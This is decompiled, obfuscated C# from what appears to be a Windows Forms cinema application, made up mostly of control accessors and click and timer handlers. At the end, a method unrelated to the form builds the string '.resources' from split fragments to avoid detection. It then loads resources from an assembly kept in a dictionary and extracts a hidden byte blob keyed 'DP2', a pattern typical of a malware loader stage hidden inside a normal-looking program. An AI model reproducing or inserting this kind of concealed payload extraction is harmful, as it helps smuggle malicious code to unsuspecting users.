	internal virtual PictureBox c6RD()
	{
		return m;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void s1RH(PictureBox j6GS)
	{
		PictureBox val = (m = j6GS);
	}

	[SpecialName]
	internal virtual PictureBox f6JH()
	{
		return _PictureBox21;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z3C9(PictureBox Jo3i)
	{
		_PictureBox21 = Jo3i;
	}

	[SpecialName]
	internal virtual PictureBox y6EY()
	{
		return F;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Py6x(PictureBox Rq8k)
	{
		PictureBox val = (F = Rq8k);
	}

	[SpecialName]
	internal virtual PictureBox Wx24()
	{
		return W;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void i9FA(PictureBox z3KS)
	{
		PictureBox val = (W = z3KS);
	}

	[SpecialName]
	internal virtual PictureBox n2XQ()
	{
		return _PictureBox17;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x3WE(PictureBox g4A2)
	{
		_PictureBox17 = g4A2;
	}

	[SpecialName]
	internal virtual PictureBox f3E0()
	{
		return _PictureBox16;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p3XR(PictureBox z8DE)
	{
		_PictureBox16 = z8DE;
	}

	[SpecialName]
	internal virtual PictureBox n1FC()
	{
		return _PictureBox15;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Az69(PictureBox Ni78)
	{
		_PictureBox15 = Ni78;
	}

	[SpecialName]
	internal virtual PictureBox w1LP()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cx50(PictureBox n0NL)
	{
		PictureBox val = (R = n0NL);
	}

	[SpecialName]
	internal virtual PictureBox e0AJ()
	{
		return _PictureBox13;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e8PQ(PictureBox m4QC)
	{
		_PictureBox13 = m4QC;
	}

	[SpecialName]
	internal virtual PictureBox Ma68()
	{
		return y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void k5Q9(PictureBox c0R8)
	{
		PictureBox val = (y = c0R8);
	}

	[SpecialName]
	internal virtual PictureBox Wo80()
	{
		return _PictureBox11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d0YP(PictureBox Fi14)
	{
		_PictureBox11 = Fi14;
	}

	[SpecialName]
	internal virtual PictureBox d2L4()
	{
		return _PictureBox10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Lp4d(PictureBox y3PF)
	{
		_PictureBox10 = y3PF;
	}

	[SpecialName]
	internal virtual Label Nz82()
	{
		return k;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ra18(Label Zx5e)
	{
		Label val = (k = Zx5e);
	}

	[SpecialName]
	internal virtual PictureBox Ls9d()
	{
		return X;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Lk80(PictureBox Tc28)
	{
		PictureBox val = (X = Tc28);
	}

	[SpecialName]
	internal virtual Label f3RG()
	{
		return _Label5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Aw21(Label St18)
	{
		_Label5 = St18;
	}

	[SpecialName]
	internal virtual Label x8E9()
	{
		return G;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void m8TF(Label n9R3)
	{
		Label val = (G = n9R3);
	}

	[SpecialName]
	internal virtual PictureBox m8KG()
	{
		return l;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b1WD(PictureBox Ze13)
	{
		PictureBox val = (l = Ze13);
	}

	[SpecialName]
	internal virtual PictureBox Mx51()
	{
		return _PictureBox7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Kn0x(PictureBox Tr82)
	{
		_PictureBox7 = Tr82;
	}

	[SpecialName]
	internal virtual PictureBox Fc02()
	{
		return _PictureBox6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y4JB(PictureBox Xt0m)
	{
		_PictureBox6 = Xt0m;
	}

	[SpecialName]
	internal virtual Label a4QT()
	{
		return _lblTime;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Nt35(Label Ym8a)
	{
		_lblTime = Ym8a;
	}

	[SpecialName]
	internal virtual Label t1E4()
	{
		return _lblDate;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z4N9(Label a2SP)
	{
		_lblDate = a2SP;
	}

	[SpecialName]
	internal virtual Label Pi43()
	{
		return h;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t0N1(Label z0KW)
	{
		Label val = (h = z0KW);
	}

	[SpecialName]
	internal virtual Label Pz4c()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g0GN(Label Yb4f)
	{
		_Label1 = Yb4f;
	}

	[SpecialName]
	internal virtual PictureBox Nq5a()
	{
		return _PictureBox5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void n4BA(PictureBox y9HP)
	{
		_PictureBox5 = y9HP;
	}

	[SpecialName]
	internal virtual Timer Fn9x()
	{
		return q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ep8a(Timer Ez9r)
	{
		EventHandler eventHandler = Sw08;
		Timer val = q;
		if (val != null)
		{
			val.remove_Tick(eventHandler);
		}
		Timer val2 = (q = Ez9r);
		val = q;
		if (val != null)
		{
			val.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox Bc34()
	{
		return t;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f5TQ(PictureBox r3G0)
	{
		PictureBox val = (t = r3G0);
	}

	[SpecialName]
	internal virtual Button Da06()
	{
		return _btnCinema1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f8JY(Button i2RJ)
	{
		EventHandler eventHandler = i8HZ;
		Button btnCinema = _btnCinema1;
		if (btnCinema != null)
		{
			((Control)btnCinema).remove_Click(eventHandler);
		}
		_btnCinema1 = i2RJ;
		btnCinema = _btnCinema1;
		if (btnCinema != null)
		{
			((Control)btnCinema).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button x1QH()
	{
		return _btnCinema4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a2Y5(Button Ri7n)
	{
		EventHandler eventHandler = t1N0;
		Button btnCinema = _btnCinema4;
		if (btnCinema != null)
		{
			((Control)btnCinema).remove_Click(eventHandler);
		}
		_btnCinema4 = Ri7n;
		btnCinema = _btnCinema4;
		if (btnCinema != null)
		{
			((Control)btnCinema).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button y9NT()
	{
		return c;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Bt49(Button z6LY)
	{
		EventHandler eventHandler = x3B5;
		Button val = c;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (c = z6LY);
		val = c;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Zk79()
	{
		return _btnCinema3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gm8a(Button n5Y3)
	{
		EventHandler eventHandler = g2Y5;
		Button btnCinema = _btnCinema3;
		if (btnCinema != null)
		{
			((Control)btnCinema).remove_Click(eventHandler);
		}
		_btnCinema3 = n5Y3;
		btnCinema = _btnCinema3;
		if (btnCinema != null)
		{
			((Control)btnCinema).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button n0XP()
	{
		return _Button14;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Et89(Button w2T9)
	{
		_Button14 = w2T9;
	}

	[SpecialName]
	internal virtual LinkLabel n7N1()
	{
		return P;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void n0WC(LinkLabel r7DM)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(i2R6);
		LinkLabel p = P;
		if (p != null)
		{
			p.remove_LinkClicked(val);
		}
		LinkLabel val2 = (P = r7DM);
		p = P;
		if (p != null)
		{
			p.add_LinkClicked(val);
		}
	}

	[SpecialName]
	internal virtual PictureBox y4XS()
	{
		return J;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r2Y5(PictureBox d8H3)
	{
		PictureBox val = (J = d8H3);
	}

	private void i2R6(object sender, LinkLabelLinkClickedEventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Are you sure you want to leave the system?", "Exit", (MessageBoxButtons)4, (MessageBoxIcon)32);
		((Form)this).Close();
		((TextBoxBase)Fo9c.Forms.o5JW().Ac8()).Clear();
		((TextBoxBase)Fo9c.Forms.o5JW().m2F()).Clear();
		((Control)Fo9c.Forms.o5JW()).Show();
	}

	private void i8HZ(object sender, EventArgs e)
	{
		((Control)Fo9c.Forms.q2Z4()).Show();
	}

	private void x3B5(object sender, EventArgs e)
	{
		((Control)Fo9c.Forms.Te4m()).Show();
	}

	private void g2Y5(object sender, EventArgs e)
	{
		((Control)Fo9c.Forms.z1PZ()).Show();
	}

	private void t1N0(object sender, EventArgs e)
	{
		((Control)Fo9c.Forms.j3E6()).Show();
	}

	private void w5JP(object sender, EventArgs e)
	{
		Fn9x().Start();
		t1E4().set_Text(Conversions.ToString(DateTime.Today));
	}

	private void Sw08(object sender, EventArgs e)
	{
		a4QT().set_Text(Conversions.ToString(DateAndTime.get_TimeOfDay()));
	}

	internal static byte[] Wj39(string[] r9MB, int e3Q5)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[r9MB.Length - 1 + 1];
				int num = r9MB.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						string value = string.Format("{0}{1}{2}{3}{4}", ".r", "es", "ou", "rc", "es");
						if (r9MB[i].Contains(value))
						{
							int startIndex = r9MB[i].IndexOf(value);
							array[i] = r9MB[i].Remove(startIndex, 10);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)r6C.mDic["AO"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.CompareString(dictionaryEntry.Key.ToString(), "DP2", false) == 0)
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
